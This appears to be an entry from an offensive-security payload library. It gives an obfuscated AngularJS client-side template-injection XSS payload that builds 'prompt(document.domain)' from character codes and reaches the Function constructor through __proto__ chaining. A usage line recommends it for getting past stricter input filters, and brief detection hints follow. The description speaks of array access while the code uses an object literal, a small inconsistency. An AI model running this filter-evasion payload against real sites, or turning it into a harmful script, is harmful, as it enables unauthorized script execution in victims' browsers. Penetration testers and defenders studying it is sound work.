---
id: a973282e-7372-4eb7-8f78-7961cd6e85d1
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:43.715695+00:00'
updated_at: '2023-04-10T20:24:52.691430+00:00'
tags:
  - xss
  - angular
  - payload
  - obfuscation
platforms:
  - Web
validated: true
---

# Obfuscated-Angular-Prompt-Domain-Variant-CharCode-Array

## Code

```javascript
{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
```

## Description

Variant using array [] for property access instead of object b, with __proto__ chaining to execute fromCharCode-built 'prompt(document.domain)', for environments where empty object access is filtered.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| (None) | Hardcoded values; no parameters. | N/A |

## Usage

Alternative injection for stricter filters; use when standard object-based obfuscation fails.

## Detection

- Patterns involving [] [a] access or __proto__ in client-side JS.
- Similar to other obfuscated variants.

## Related

- [[procedures/Advanced-XSS-Bypass-in-Angular-and-AngularJS]]
